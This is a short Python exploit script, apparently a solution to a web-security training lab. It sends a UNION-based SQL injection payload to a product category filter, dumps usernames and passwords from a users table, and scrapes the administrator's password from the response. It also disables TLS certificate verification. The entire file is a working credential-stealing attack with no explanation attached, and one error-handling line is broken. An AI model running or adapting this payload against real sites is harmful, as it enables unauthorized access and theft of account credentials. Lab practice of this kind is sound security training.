import requests 
import urllib3
import sys
from bs4 import BeautifulSoup as bs 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

s=requests.Session()
def sql_user_exploit(s,url):
    path="filter?category=Gifts"
    user='administrator'
    payload="'union select username,password from users -- "
    r=s.get(url+path+payload,verify=False)
    res=r.text
    if user in res:
        print(f"[+] finding password for admistrator : ")
        soup=bs(res,"html.parser")
        password=soup.body.find(string='administrator').parent.find_next('td').contents[0]
        return password
    else:
        return False
        
if __name__ =='__main__':
    
    try:
        url=input(f"Please enter base url : ")
        
        if not url:
            raise("Plesse provide proper base url : ")
        
        password=sql_user_exploit(s,url)
        if password:
            print(f"Password of administrator is : {password}")
        else:
            print("password not  found")
    except ValueError as e :
        print(f"error {e}")
        sys.exit()